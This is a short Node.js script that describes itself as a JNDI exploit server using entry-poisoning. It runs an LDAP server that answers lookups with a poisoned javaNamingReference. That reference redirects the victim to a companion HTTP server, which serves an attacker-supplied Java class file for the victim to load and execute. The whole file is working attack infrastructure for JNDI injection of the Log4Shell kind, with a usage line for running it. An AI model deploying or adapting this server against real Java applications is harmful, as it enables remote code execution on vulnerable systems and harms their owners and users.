/*
  Simple JNDI exploit server using entry-poisoning
*/


const ldap = require('ldapjs');
const fs = require('fs')
const http = require('http')

if (process.argv.length < 4){
        console.log('Usage: node server.js <java class file> <port>')
        process.exit(1)
}

const port = parseInt(process.argv[3])
const bytecode = fs.readFileSync(process.argv[2])
const exploitFile = process.argv[2]


const LDAP_SERVER = ldap.createServer();

// LDAP route
LDAP_SERVER.search('o=a', (req, res, next) => {
  console.log('LDAP SERVER hit!')
  // RFC 2713 defines JNDI Reference attributes
  let redirect = `http://${req.connection.ldap.id.split(':')[0]}:${port+1}/`
  console.log('Redirecting to ', redirect)
  const obj = {
    dn: 'Y249RXhwbG9pdCw=',
    cn: 'exploit',
    attributes:{
      objectclass: 'javaNamingReference',
      javaCodebase: redirect,
      javaFactory: 'Exploit',
      javaClassName: `${redirect}Exploit.class`
    }
  }
  res.send(obj)
  res.end()
  return next()
})

// World's simplest HTTP server.
const HTTP_SERVER = http.createServer( (req, res) => {
  console.log("HTTP server hit!")
  res.writeHead(200)
  res.end(bytecode)
})

// Servers start listening
LDAP_SERVER.listen(port, () => {
  console.log('LDAP server @ port =', port)
  HTTP_SERVER.listen(port+1, () => {
    console.log('HTTP server @ port =', port+1, "Serving", exploitFile)
  })
})
